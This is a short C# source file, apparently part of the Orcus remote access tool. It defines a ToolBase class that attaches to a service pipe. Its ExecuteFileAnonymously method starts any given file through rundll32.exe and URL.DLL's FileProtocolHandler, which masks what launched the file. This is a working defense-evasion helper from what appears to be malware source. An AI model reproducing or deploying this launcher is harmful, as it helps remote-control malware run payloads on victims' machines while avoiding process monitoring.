using System;
using System.Diagnostics;
using System.IO;
using Orcus.Plugins;
using Orcus.Service;

namespace Orcus.CommandManagement
{
    internal class ToolBase : IToolBase
    {
        public ToolBase()
        {
            if (ServiceConnection.Current.IsConnected)
                ServicePipe = ServiceConnection.Current.Pipe;
        }

        public void ExecuteFileAnonymously(string path)
        {
            var file = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "rundll32.exe");
            if (!File.Exists(file))
                Process.Start(path);
            else
                Process.Start(
                    file,
                    $"URL.DLL,FileProtocolHandler \"{path}\"");
        }

        public IServicePipe ServicePipe { get; }
    }
}